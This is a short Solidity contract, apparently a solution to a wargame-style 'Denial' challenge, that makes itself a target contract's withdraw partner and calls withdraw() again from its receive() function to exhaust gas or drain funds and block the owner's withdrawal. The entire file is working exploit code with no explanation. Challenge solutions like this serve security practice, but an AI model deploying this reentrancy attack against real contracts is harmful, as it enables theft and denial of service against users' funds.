pragma solidity ^0.8.0;

contract DenialExploit {
    address private immutable denialInstance;

    constructor(address _denial) {
        denialInstance = _denial;
    }

    receive() external payable {
        (bool success,) = denialInstance.call(abi.encodeWithSignature("withdraw()"));
        // Allow reentrancy attempts without requiring success
    }

    function setPartner(address denial) public {
        (bool success,) = denial.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
        // Do not require success here
    }

    function attack() public {
        setPartner(denialInstance);
        (bool success,) = denialInstance.call(abi.encodeWithSignature("withdraw()"));
        // Do not require success here
    }
}